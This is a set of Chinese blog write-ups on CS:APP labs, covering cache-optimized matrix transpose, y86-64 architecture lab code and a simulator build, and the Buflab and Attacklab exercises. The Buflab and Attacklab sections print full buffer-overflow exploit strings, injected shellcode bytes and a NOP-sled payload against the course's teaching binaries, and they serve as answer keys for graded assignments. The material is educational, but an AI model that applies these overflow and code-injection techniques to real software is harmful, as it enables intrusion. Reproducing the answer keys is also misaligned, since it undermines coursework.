67长宽均是质数，很大一定程度上使得miss数会少一些，当然，这也使得很难通过一些优化将miss减少到一个很低的数值。题目要求的miss数是2000以内，其实只要分块的大小选取得当就很简单了。笔者选择的是16 * 8的块，当然，16 * 16的听说也可以。这个比较随意了，就是一个调参的过程而已。理解清楚之后，和前面那道32 * 32的基本没有区别，代码就不贴了，意义不大。 64 * 64 这个应该就是这个lab最难的一个点了。由于每一行有64个int值，因此，每一行需要占用8个set，即4行就可以把set填满。因此，如果还是采用8 * 8的分块的话，第5～8行占用的set和第1～4行是一样的，这就会导致B矩阵每一次取值都是miss。总的miss率会特别高，显然不恰当。 而如果我们尝试这采用4 * 4的分块法呢？很明显，4 * 4可以避免上面的这种情况。然而又带来了另一个问题，4 * 4中cache的利用率太低了，每次读取8个int，最后用到的却只有4个，因此，这种做法最后miss数大概是1600+，离满分还有很大距离。笔者就是在这里想了很久还是不懂。最后还是去网上看了一下一些其他的思路，最后才恍然大悟(但总觉得这道题有点太取巧了)。下面是我最后获得满分的一个思路(如果涉及侵权，请及时联系我删除)： 为了使得cache的利用率达到最大，我们还是得采用8 * 8的分块法，但是，同样的又要避免第5～8行和第1～4行发生conflict miss，我们不能一次性对一整列8个数字进行填充。最后我们采用的策略基于矩阵转置以下的性质： 对于任意矩阵A，我们将A的转置矩阵记为AT。对于每一个8 * 8的块，我们可以将其分成4个4 * 4的子矩阵。分别记为A1，A2，A3，A4。对与A的转置操作，我们可以分解为如下： 由此，我们可以将整个8 * 8的矩阵的转置分解为以下的三个步骤。 对A矩阵的上半部分处理，每次读取A的一行，将A坐上角部分转置后放在B的左上角处，将A右上角转置后放在B的右上角 对A矩阵的左下角部分进行处理，按列读取A的右下角中的每一列(4个数字)，再按行读取B右上角中的每一行，然后将A读取到的四个数字横放在B的右上角，再将B读取到的四个数字放在B的左下角。本质上其实就等价于将左下角转置后放在B的右上角，将B右上角中上一步得到的数字放在了B的左下角。 对A矩阵的右下角部分进行处理，将A右下转置并放到B右下当中 其中，第二步是最关键的部分。为什么这样能够减少miss数呢？如果我们假设4 * 4矩阵平均的miss数为n的话，对于上面三个步骤，我们每一步产生的miss数均大致为n，也就是说，对于一个8 * 8的矩阵，我们的miss数由原先所需的4n降低到了3n。第一步和第三步为n这个很好理解，第二步建议自己再画图理解清楚。最后我们得到的miss数为1100+，而4 * 4的分块约为1600，这也和我们的估计值基本相当。 以下是代码，仅供参考：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int t1, t2, t3, t4, t5, t6, t7, t0;for (i = 0; i &lt; N; i+=K) &#123; for (j = 0; j &lt; M; j+=K) &#123; // 以下循环将A左上转置后移动到B坐上 // 将A右上转置后移动到B右上 for(int ii = i; ii &lt; i + 4; ii++) &#123; t0 = A[ii][j]; t1 = A[ii][j+1]; t2 = A[ii][j+2]; t3 = A[ii][j+3]; t4 = A[ii][j+4]; t5 = A[ii][j+5]; t6 = A[ii][j+6]; t7 = A[ii][j+7]; B[j][ii] = t0; B[j+1][ii] = t1; B[j+2][ii] = t2; B[j+3][ii] = t3; B[j][ii+4] = t4; B[j+1][ii+4] = t5; B[j+2][ii+4] = t6; B[j+3][ii+4] = t7; &#125; // 将A左下角转置并移动到B右上角 // 将B右上角移动到B左下角 for(int jj = j; jj &lt; j + 4; jj++) &#123; t0 = A[i+4][jj]; t1 = A[i+5][jj]; t2 = A[i+6][jj]; t3 = A[i+7][jj]; t4 = B[jj][i+4]; t5 = B[jj][i+5]; t6 = B[jj][i+6]; t7 = B[jj][i+7]; B[jj][i+4] = t0; B[jj][i+5] = t1; B[jj][i+6] = t2; B[jj][i+7] = t3; B[jj+4][i] = t4; B[jj+4][i+1] = t5; B[jj+4][i+2] = t6; B[jj+4][i+3] = t7; &#125; // 将A右下转置后移动到B右下 t0 = A[i+4][j+4]; t1 = A[i+4][j+5]; t2 = A[i+4][j+6]; t3 = A[i+4][j+7]; t4 = A[i+5][j+4]; t5 = A[i+5][j+5]; t6 = A[i+5][j+6]; t7 = A[i+5][j+7]; B[j+4][i+4] = t0; B[j+5][i+4] = t1; B[j+6][i+4] = t2; B[j+7][i+4] = t3; B[j+4][i+5] = t4; B[j+5][i+5] = t5; B[j+6][i+5] = t6; B[j+7][i+5] = t7; t0 = A[i+6][j+4]; t1 = A[i+6][j+5]; t2 = A[i+6][j+6]; t3 = A[i+6][j+7]; t4 = A[i+7][j+4]; t5 = A[i+7][j+5]; t6 = A[i+7][j+6]; t7 = A[i+7][j+7]; B[j+4][i+6] = t0; B[j+5][i+6] = t1; B[j+6][i+6] = t2; B[j+7][i+6] = t3; B[j+4][i+7] = t4; B[j+5][i+7] = t5; B[j+6][i+7] = t6; B[j+7][i+7] = t7; &#125;&#125; 关于driver.py文件 driver.py是用python语言编写的脚本文件。在做这个任务时，笔者电脑中python的版本是3.7。运行driver.py的时候，出现了异常错误。经打开后发现，这个文件中的python的版本应该是3.0以前的，由于python2.x 和 python3.x的一些语法做了大幅度的修改，因此该文件无法正常运行。如果你也遇到了同样的错误，可以尝试这用以下方法解决： 将文件中所有print 后面的表达式加上一个括号。如print “Hello world” 应改为 print(“Hello world”)。python3.0开始就已经不再使用print x这种类型的表达式了。 将所有调用到subprocess.Popen函数的式子括号内再加上universal_newlines=True参数。如83～84行应该改为p = subprocess.Popen(“./test-trans -M 61 -N 67 | grep TEST_TRANS_RESULTS”, shell=True, stdout=subprocess.PIPE, universal_newlines=True) 89行改为csim_cscore = list(map(int, resultsim[0:1])) 关于前面的archlab-32和performance-lab 这两个实验没有写博客。archlab-32和archlab题目上基本没有什么很大的差别，大体的解决思路类似，因此基本上没有什么重复写博客的必要。然后performance-lab则是因为这个实验难度比较小，没有什么可以写的(虽然这个实验我还是有做的)，基本上就是简单的loop unrolling加上分块就可以拿到比较好的分数了。而且题目和Chapter 6的最后两道课后题很类似。这里就不再赘述了。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>cache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Archlab]]></title>
    <url>%2F2019%2F01%2F18%2Fcsapp-Archlab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第五篇文章。具体题目请见官网。本文主要讲csapp中的architecture lab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 同样的，在正式开始实验之前，建议先把官方的资料看一遍，保证对实验需要做什么，怎么做有一定的了解。总体来说，本实验在不追求满分的情况下，还是很容易通过的。主要难度都是在part C上，尤其要优化到高分十分困难，笔者最后的得分为56.3/60.0，仅供参考。 architecture lab 实验要求 这个实验总共分为三个部分，part A, part B, part C。其中，第一部分要求我们将三个用C写的函数翻译成y86-64指令，第二部分要求我们往seq ISA中添加一个新的指令iaddq。第三个部分给了我们一个ncopy的函数和一个pipeline的hcl文件，要求我尽可能地加快程序运行的速度。结果是用CPE(cycles per element)来衡量。达到9.0即算实验通过，7.5为满分。 实验文件(主要用到的在三个文件夹当中)misc：part A 需要用到的文件夹seq： part B 所在文件夹pipe：part C 所在文件夹 实验目的 加深对CPU的指令集架构的了解，理解pipeline的基本实现原理 理解hardware和software之间的基本联系。简单了解它们之间是如何配合协作的 掌握一些程序优化的简单方法 y86-64 模拟器的配置 个人认为，这个应该是本实验最麻烦的一个点了。花了很长的时间，出了各种bug，下面进行安装过程进行简单的介绍。 所用系统为:arch-linux。不同版本对同一个问题的解决方法可能不太一样，但大体上有相似之处，下面仅供参考 tcl/tk 如果不想安装GUI界面的同学可以忽略此步 首先，本实验比较老，需要用到的tcl/tk版本号为8.5，8.6以上的版本没办法正常使用。然而，现在直接下载默认的应该是8.6版本的，因此我们需要制定版本号。在arch下，本人是直接使用yay（需要自行安装）进行下载。 yay tcl85 // yay tk85 这样的命令行即可。然后我们进入sim文件夹下。使用make编译。发现报错了。出现了类似这样的错误信息。 我们需要更改makefile文件。如下图所示(记得对照清楚一下)。 再次进行编译。又报出新的错误。错误信息大概是这样。 psim.c:23:10: fatal error: tk.h: No such file or directory #include &lt;tk.h&gt;compilation terminated. 看错误信息，我们发现，编译的时候找不到tk.h这个函数库。因此，我们去系统的函数库里面看一下，进入Root/usr/include文件夹下，ctrl+f搜索，我们发现tk.h放在了tk8.5这个文件夹下，因此编译的时候在include文件夹下找不到tk.h。我们只需要将psim.c中的tk.h更改为tk8.5/tk.h即可。(同理，ssim.c也需要修改) 好了，这个时候再次编译，我们又发现还是过不了。出现了类似这样的错误信息。 /usr/bin/ld: /tmp/cc44VPBY.o:(.data.rel+0x0): underfined reference to ‘matherr’ matherr没有定义？？这是怎么回事。我们进入matherr所在文件(psim.c和ssim.c)看一下。找到了这样的两行代码： extern int matherr();int *tclDummyMathPtr = (int *) matherr; 直接注释掉即可。最后，我们再进行编译。在sim文件夹下make clean; make 我们成功地完成了GUI界面的编译。当然，要是过不了也没有什么关系，我们可以把上面图片中makefile那三行注释掉，这样编译出来的是文本界面，但不需要tcl/tk，也就不会一直报错了。 实验正文part A 这部分其实没什么好讲的。就是简单地把一个函数翻译成y86-64代码而已。在misc文件夹下新建文件sum.ys，把自己翻译的代码打进去然后用yas编译，yis运行即可，最终%rax的数据为0xcba即正确了。自己可以进行校对。下面是我的sum.ys的代码。其余两个不贴上来了。主要是注意一下一开是要先设置pos，还有把栈顶放在%rsp上面即可。123456789101112131415161718192021222324252627282930313233343536.pos 0init: irmovq Stack, %rsp call Main halt .align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0Main: irmovq ele1,%rdi call sum_list retsum_list: irmovq $0,%rax jmp testloop: mrmovq 0(%rdi),%rcx addq %rcx,%rax mrmovq 8(%rdi),%rcx rrmovq %rcx,%rditest: andq %rdi,%rdi jne loop ret .pos 0x100Stack: part B 这个部分同样比较简单，添加一个IIADDQ指令。文件位于/seq/seq-full.hcl 我们只需要在以下几个变量中添加IIADDQ的判断即可。 instr_valid need_regids need_valC dstE中结果为rB的分支 aluA中结果为valC的分支 aluB中结果为valB的分支 setCC 经过资料中的几个测试后，该题顺利解决。 part C 这道题很难，尤其是如果要追求满分的话。当然，要有分也没那么容易。在pipe文件夹下： ./correctness.pl // 检测自己的答案是否正确./benchmark.pl // 测试自己的分数是多少 这道题我们能操作的文件就只有pipe.hcl和ncopy.ys。也就是说，分别从硬件和软件两个方面进行优化。首先是hcl文件，很显然，官方资料已经提示了我们，本题需要实现iaddq指令，这样做起来方便很多，可以将CPE降到13左右吧。虽然还是0分。具体和part B极其相似，这里不再赘述。 由于资料中还提示我们，建议去看loop unrolling的部分，这告诉了我们，本题最大的优化在循环展开这里。于是，笔者不得不先提前去看了一下书上循环优化部分的内容。为什么循环优化能够提高那么多呢？ 注意到我们的每次循环过程中，迭代器都要+1，并且src和dst两个指针也要对应地发生移动，然而，这样的指令对于我们答案的得出并没有实质性的直接帮助，因此，我们应该尽量减少这样的指令的产生比如：1234567int sum = 0;for (int i = 0;i &lt; n; i++)sum += a[i];int sum = 0;for (int i = 0;i &lt; n; i+=2)sum = sum + a[i] + a[i+1]; 两个程序进行对比，很明显，下面的程序的效率要远远高于上面那个。尤其当n越大时，效果更明显。而题目给的程序中，需要递增的有三个数，这就使得循环优化变得更加重要。对于循环k路的选择上面，个人选择了k = 8。即每次n的变化应该是8。总体上来说，和四路的效率比较接近。具体实现过程中，整体思路是，先将n - k, 然后再进行n/k轮迭代，最后再把余数进行处理。具体可以见最下方的参考 进行了循环优化以后，我们还发现，程序中有类似这样的两行。 mrmovq (%rdi),%r10rmmovq %r10,(%rsi) 记性比较好的读者应该会记得，书中有提到过这样的例子。第二行的rmmovq指令执行到decode stage时，上面那一行还在execute stage，这个时候，我们并不知道(%rdi)的值具体是多少，也就是说，这个时候我们没办法通过data forwarding将数据送往decode stage。于是，rmmovq指令只好停留在本阶段，于是我们浪费了一个clock cycle，这是一种典型的load interlock, 处理办法是将另一个指令插入这两个指令中。然而下面的andq %r10,%r10指令我们也用不了，同样需要读取%r10，无法避免cycle的浪费. 因此，我们选择将下面的一个mrmovq提到上面来，即变成 mrmovq (%rdi),%10mrmovq 8(%rdi),%r9rmmovq %r10,(%rsi) 这样以来就不会发生cycle的浪费了。这个时候我们再进行测试的话，分数应该已经挺高了。当然，还有一些小小的优化可以调整。比如余数的处理上等等。这里给一个看到的处理得比较好的文章供参考，这篇文章作者还使用了一个三叉搜索树构造跳转表，再一次提高了效率(已经接近满分了)。这里我就不再赘述了。 其实我们会看到，想要提高CPE(CPI)，其实最主要就是三个方面，一个是use/load的冲突，如上面的mrmovq和rmmovq，这会消耗掉一个cycle；第二个是return语句，由于pipeline的设计，我们不知到会跳哪个位置，只能等到return执行到memory stage的时候才能确定，这将会浪费掉三个cycle；还有一个就是JXX中的条件跳转(非条件没有影响)，一旦分支预测错误，将会浪费掉两个cycle，而跳转指令在我们的程序中又特别的常见，因此，这是我们很大的一个优化方向，不仅是在这个实验当中。对于一个跳转指令，在特定的ISA下，我们应该尽量想办法在软件层面做处理，提高分支预测的准确率(比如在可能的情况下用data flow替换掉control flow)。书中也提到，现代的处理器的stage是远不止五个的，一旦分支预测出现错误，处理器调整的开销将长达十几个时钟周期。这个应该也是我看第四章留下的印象最深刻的地方吧。 下面是我的代码(其中也用到了其他一些小优化，比如分支的调整之类的)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138xorq %rax,%rax # count = 0iaddq $-8,%rdx # n - 8jl Test # if n &lt; 8 jump to TestLoop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r9 andq %r10,%r10 rmmovq %r10,(%rsi) jle Npos1 iaddq $1,%raxNpos1: andq %r9,%r9 rmmovq %r9,8(%rsi) jle Npos2 iaddq $1,%raxNpos2: mrmovq 16(%rdi),%r10 mrmovq 24(%rdi),%r9 andq %r10,%r10 rmmovq %r10,16(%rsi) jle Npos3 iaddq $1,%raxNpos3: andq %r9,%r9 rmmovq %r9,24(%rsi) jle Npos4 iaddq $1,%raxNpos4: mrmovq 32(%rdi),%r10 mrmovq 40(%rdi),%r9 andq %r10,%r10 rmmovq %r10,32(%rsi) jle Npos5 iaddq $1,%raxNpos5: andq %r9,%r9 rmmovq %r9,40(%rsi) jle Npos6 iaddq $1,%raxNpos6: mrmovq 48(%rdi),%r10 mrmovq 56(%rdi),%r9 andq %r10,%r10 rmmovq %r10,48(%rsi) jle Npos7 iaddq $1,%raxNpos7: andq %r9,%r9 rmmovq %r9,56(%rsi) jle Npos8 iaddq $1,%raxNpos8: iaddq $64, %rdi # add the *src, *dst iaddq $64, %rsi iaddq $-8, %rdx # sub i jge Loop # loopTest: # n + 8 to deal with remaining numbers iaddq $8,%rdx jne Rem1 retRem1: mrmovq (%rdi), %r10 mrmovq 8(%rdi), %r9 andq %r10, %r10 jle Pos1 iaddq $1, %raxPos1: rmmovq %r10, (%rsi) iaddq $-1, %rdx jne Rem2 retRem2: andq %r9, %r9 jle Pos2 iaddq $1, %raxPos2: rmmovq %r9, 8(%rsi) iaddq $-1, %rdx jne Rem3 retRem3: mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r9 andq %r10, %r10 jle Pos3 iaddq $1, %raxPos3: rmmovq %r10, 16(%rsi) iaddq $-1, %rdx jne Rem4 retRem4: andq %r9, %r9 jle Pos4 iaddq $1, %raxPos4: rmmovq %r9, 24(%rsi) iaddq $-1, %rdx jne Rem5 retRem5: mrmovq 32(%rdi), %r10 mrmovq 40(%rdi), %r9 mrmovq 48(%rdi), %r8 andq %r10, %r10 jle Pos5 iaddq $1, %raxPos5: rmmovq %r10, 32(%rsi) iaddq $-1, %rdx jne Rem6 retRem6: andq %r9, %r9 jle Pos6 iaddq $1, %raxPos6: rmmovq %r9, 40(%rsi) iaddq $-1, %rdx jne Rem7 retRem7: andq %r8, %r8 jle Pos7 iaddq $1, %raxPos7: rmmovq %r8, 48(%rsi) 总结 这个实验本身来说难度并不能算大，甚至比课后练习还要稍微容易一点，但是需要对CPU的pipeline有比较清晰的了解，否则做起来会特别的吃力。由于我自己本身是读软件方面的，对硬件很多东西其实也不怎么了解(基本上师兄在说的时候也是觉得这一章可以不用怎么看)，加上现在才大一，很多知识，比如电路方面的都还没学，看得时候都要查一下一些概念什么的。当然最后我还是坚持顽强地把它啃下来了(算上实验和各种其他杂七杂八的东西，总共花了一个星期多一点吧)。花了很长的时间，尤其是pipeline那一块，到现在都觉得自己的理解并不是很到位，还有一些小细节没有搞清楚。我也不知到为什么一个读软件的要对涉及到已经几乎是硬件层面的东西要这么花时间，我也不知到自己花了这么长的时间去看这个究竟有没有意义。可能这就是对计算机的热爱吧(逃]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>y86-64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Buflab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Buflab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。 buflab 实验要求 这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。 实验文件bufbomb：我们需要攻击的对象hex2raw：帮助我们成功攻击字符串的文件makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; buflab 的一些注意点 首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意 1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。 2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。 3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。 level 0 首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：123456#define NORMAL_BUFFER_SIZE 32unsigned getbuf() &#123; char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1;&#125; 可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。 level 1 这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)： 60 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 42 8c 04 08 // 跳转到fizz函数入口60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉 level 2 对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。123mov $0x53c4e5c0,%eax // 左侧的值为cookie，我们先将其移动到%eaxmov %eax,0x804d100 // 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)ret 将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 a3 00 d104 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 00 39 68 559d 8c 04 08 level 3 这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。 首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有push %ebp这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。 为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。 因此，我们可以得到答案： 60 60 60 60 60 60 60 60b8 c0 e5 c4 53 68 be 8d // 将cookie放到%eax, 并把test中的下一个指令位置push进栈04 08 c3 60 60 60 60 6060 60 60 60 60 60 60 6060 60 60 60 60 60 60 6050 39 68 55 00 39 68 55 // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了 level 4 不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。 要保证栈不被破坏，我们在注入的代码中还需要做到以下几点： 1. 找到%ebp对应的值，并将其写入其中。 2. 将cookie放入%eax中，作为返回值 3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。 其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。 以下是我的答案： 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a8e 04 08 8d 6c 24 2c c3 90 90 90 90 00 38 68 55]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Attacklab]]></title>
    <url>%2F2019%2F01%2F15%2Fcsapp-Attacklab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第三篇文章。具体题目请见官网。本文主要讲csapp中的attacklab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。 个人觉得这个实验比起前面两个还是要稍微简单一点的，但是强烈建议把官网给的资料看一下，看完相信对完成这个实验还是有很大帮助的。整个实验主要是一开始无从下手以及最后一个level比较麻烦，但结合资料的相关提示的话，做起来难度还是不大的，建议尝试着不看任何其他教程自己独立完成。 attacklab 实验要求 这个实验要求我们使用缓冲区溢出对ctarget和rtarget进行攻击。总共有五个关卡，其中，前三个要求使用代码注入(code injection)对ctarget进行攻击，后面两个要求使用return-oriented programming(ROP)对rtarget进行攻击。 实验文件：ctarget 和 rtarget：我们需要攻击的对象。hex2raw：帮助我们用来生成攻击字符串的文件。cookie: 识别文件，用来区分不同的用户(一般拿到的值是一个随机的8位16进制数)farm.c：用于提供gadget，与后面两个关卡有关。 实验目的：熟练掌握gdb和objdump的相关功能加深对缓冲区溢出现象的理解，以及懂得如何简单地对某个程序进行缓冲区溢出攻击了解x86-64的一些指令的编码等 target 文件的一些注意点 无论是rtarget还是ctarget两个文件都有相似的构造。两个文件都包含有下面的函数。12345678910void test() &#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125;unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; 其中，BUFFER_SIZE是宏定义，我们暂时不知道是多少，然后Gets()函数和gets()函数的功能基本相同。很明显，一旦我们输入的字符串比较长的时候，这就会产生缓冲区溢出的现象。因此，我们需要利用这一点，对该程序进行攻击。具体其他很多函数的细节，其实可以完全不去管。我们需要做的仅仅是生成一个特定的满足要求的字符串，通过overwrite栈上面的数据，使得getbuf函数无法顺利返回，并且，成功运行事先就存在于文件中的函数touchx()。 再次强调一下，所有需要了解的相关细节和知识点在官方资料中都有提到，本文基本上只是对该资料的部分内容进行翻译，以及提供一个完成该实验的思路，仅供参考。 Part I：level 1 第一题比较简单，是让我们熟悉一下相关的一些操作。在正式开始实验以前，建议先使用objdump将rtarget和ctarget反编译，可以使用类似objdump -d ctarget &gt; ctarget.txt 等命令将反编译文件写入txt中，便于查看。 我们先看一下getbuf中BUFFER_SIZE究竟是多少。查看ctarget.txt中的内容有以下几行：12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 由上图，我们可以看到，BUFFER_SIZE应该是一个小于40(0x28)的数字。%rsp+0x28上存放的地址就是函数正确返回的时候，PC需要指向的地址。这也是我们需要overwrite的地方。123456void touch1() &#123; vlevel = 1; printf("Touch1!: You called touch1()\n"); validate(1); exit(0);&#125; 如上图，touch1不需要我们传入任何参数，因此我们只需要将返回地址覆盖为touch1的入口地址即可。注意这里是采用小端法。 注意到，一个函数返回时，对应的汇编语句为 ret，这个时候程序会取出位于栈顶的8个字节的数据，并将其弹出，最后再将PC(program counter)更改为从栈顶取出的那个数据，本质上这其实就是一个control transfer的过程，将控制权从一个函数转移到另一个函数。答案可以为： 61 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 6161 61 61 61 61c0 17 40 00 00 00 00 00 /* 这一行即为touch1的入口地址。前面的40个字节在函数返回时相当与丢失了。 */ 将上图中的编码存在某个文件中(这里我存在ctarget1.txt中)，然后使用如下指令即可(注意ctarget和hex2raw应该在当前目录下)： cat ctarget1.txt | ./hex2raw | ./ctarget -q Part I： level 2 有了上一题的基础，我们对实验稍微熟悉一些了。接下来的我们需要进入touch2函数了。12345678910void touch2(unsigned value) &#123; vlevel = 2; if (val == cookie) &#123; ... validate(2); &#125; else &#123; ... fail(2); &#125;&#125; 这个函数需要我们传入一个参数，同时这个参数还要和cookie相等(还记得实验文件中有一个cookie吗？这个cookie就是就是那个文件里面的数字的值)。 由于需要传入参数，没那么好处理了。这个时候我们就需要注入自己的代码了。 我们需要实现这样的一个指令： mov $cookie, %rdi // cookie为和每个用户对应的那个数字ret 